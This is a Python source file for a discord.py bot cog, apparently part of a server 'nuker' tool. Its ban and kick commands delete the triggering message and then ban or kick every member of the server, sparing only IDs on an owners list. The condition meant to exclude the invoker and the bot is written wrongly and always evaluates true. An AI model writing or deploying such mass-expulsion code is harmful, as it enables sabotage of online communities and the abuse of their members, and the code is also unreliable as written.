"""Bans and kicks files"""

# Discord 
import discord
from discord.ext import commands
# Utils
from utils.data import read_owners

class Expulsions(commands.Cog):
    
    def __init__(self, bot):
        self.bot = bot
        

    @commands.command(aliases=['ban_members', 'Ban'])
    async def ban(self, ctx):
        """Ban all users as posible"""
        await ctx.message.delete()
        guild = ctx.guild
        for member in guild.members:
            try:
                if member.id in read_owners():
                    continue
                elif not member.id == ctx.author.id or self.bot.user.id:
                    await guild.ban(member)
                    print(f'{member} has been banned')
            except:
                print(f'Cant ban {member}')
                continue
            

        
    @commands.command(aliases=['kick_members', 'Kick'])
    async def kick(self, ctx):
        """Kick all users as possible"""
        await ctx.message.delete()
        guild = ctx.guild
        for member in guild.members:
            try:
                if member.id in read_owners():
                    continue
                elif not member.id == ctx.author.id or self.bot.user.id:
                    await ctx.guild.kick(member)
                    print(f'{member} has been kicked')
            except:
                print(f'Cant kick {member}')
                continue
                

def setup(bot):
    bot.add_cog(Expulsions(bot))